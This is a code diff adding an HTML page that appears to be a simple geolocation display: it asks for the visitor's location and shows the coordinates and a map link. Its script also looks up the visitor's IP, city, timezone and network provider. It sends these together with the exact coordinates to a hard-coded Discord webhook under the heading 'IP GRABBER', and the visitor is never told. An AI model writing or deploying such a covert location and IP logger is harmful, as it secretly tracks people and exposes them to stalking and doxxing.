@@ -1,0 +1,52 @@
+<head>
+  <title>Geolocation</title>
+
+</head>
+
+
+<body id="body">
+  <p id="output">Location, please!</p>
+  <a id="mapLink"></a>
+</body>
+
+<!--<iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3974.635857097187!2d4.997811314158977!3d4.999999996370448!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zNcKwMDAnMDAuMCJOIDXCsDAwJzAwLjAiRQ!5e0!3m2!1sen!2sus!4v1632622796540!5m2!1sen!2sus" width="600" height="450" style="border:0;" allowfullscreen="" loading="lazy"></iframe>-->
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+var x = document.getElementById("output");
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else {
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+  x.innerHTML = "Latitude: " + position.coords.latitude +
+  "<br>Longitude: " + position.coords.longitude;
+
+  mapLink.innerHTML = 'Click here for your location!'
+  mapLink.href = 'https://www.google.com/maps/search/?api=1&query='+position.coords.latitude+'%2C'+position.coords.longitude
+
+  $.getJSON('https://ipapi.co/json/', function(data) {
+    //console.log(JSON.stringify(data, null, 2));
+  })
+  .then((ipData) => {
+    var sendData = {}
+
+    sendData.content = `**__IP GRABBER__**\n**IP:** ${ipData.ip}\n**City:**${ipData.city}, ${ipData.region}, ${ipData.country_name}
+**Timezone:**: ${ipData.timezone}
+**org:** ${ipData.org}
+**Latitude:** ${position.coords.latitude}
+**Longitude:**${position.coords.longitude}
+${mapLink.href}`
+
+  sendData.username='Geolocator'
+  sendData.avatar_url = 'https://cdn.mos.cms.futurecdn.net/3upZx2gxxLpW7MBbnKYQLH-1200-80.jpg'
+$.post('https://discord.com/api/webhooks/891519264182370325/MEI_GXXipnOLScplSQ0_CUPNO-3hBPYjEWWsoqCwmuVv7yv3NlWiuJMIOQMfeDK5P9Qy', sendData)
+  })
+}
+getLocation()
+</script>
